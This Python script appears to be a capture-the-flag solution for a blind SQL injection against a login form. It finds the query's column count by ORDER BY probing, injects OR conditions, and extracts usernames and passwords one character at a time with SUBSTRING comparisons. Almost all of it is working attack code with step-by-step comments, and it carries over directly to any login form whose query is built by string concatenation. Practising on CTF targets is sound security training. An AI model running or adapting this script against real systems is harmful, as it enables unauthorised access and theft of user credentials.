import requests
from string import printable

url = 'http://cyberchallenge-web:9036'

def submit(query, password):
     exploit = {
        "username":query,
        "password":password
    }
     response = requests.post(url, data=exploit)
     return response.text

# *** TARGET QUERY ***
# SELECT id, password FROM users WHERE id='input1' and password='input2'

#1: Find columns of the query with the 'order by query': 
#   If you submint "order by n-- " and then you receive an error, this could not be
#   the number of columns. If you don't get any error, than you have found an existing number of
#   columns. If you iterate this query starting from one to n, and n gives you error, than n-1 is the
#   number of columns
fColumns = False
columns = 1

while(not fColumns):
    query = "'order by " + str(columns) + "-- "
    
    if "Warning" not in submit(query, "a"):
        columns += 1
    else:
        fColumns = True
        columns = columns-1

#2: Obtain the two names of the two columns. These two queries did not make error and allowed to acceed the database, so the two name of the columns are username and password
passwordColumn = "a'OR password='admin'-- "
usernameColumn = "a'OR username='admin'-- "

#3: Obtain users column
# fUsers = False

# user = ""
# users = []
# first_chars = []


# i = 1
# while(not fUsers):
#     old_target_value = user
#     for char in printable.strip(): 
#         if char not in first_chars:
#             query = "'OR SUBSTRING(username, 1, " + str(i) + ") = '" + user + char + "'# "

#             if "Incorrect credentials" not in submit(query):
#                 user += char
#                 i += 1
#                 break

#     if old_target_value == user:
#         if user.lower() not in users:
#             print(user)
#             users.append(user.lower())
#             first_chars.append(user[0])
#             user = ""
#             i = 1
#         else:
#             print(users)
#             fUsers = True

# USERS : 
users = ["admin", "pysu", "federloi", "takkino"]
            


#4: Obtain passwords column
fPasswords = False
password = ""
passwords = []

i = 1

for user in users:
    fPasswords = False
    while(not fPasswords):
        for char in printable.strip(): 
            query = user + "'AND SUBSTRING(password, 1, " + str(i) + ") = '" + password + char + "'# "

            print(query)
            if "Incorrect credentials" not in submit(query, "a"):
                password += char
                print(password)
                i += 1
                break
        
        if "Incorrect credentials" not in submit(user, password):
            passwords.append(password)
            password = ""
            i = 1
            fPasswords = True

        





          



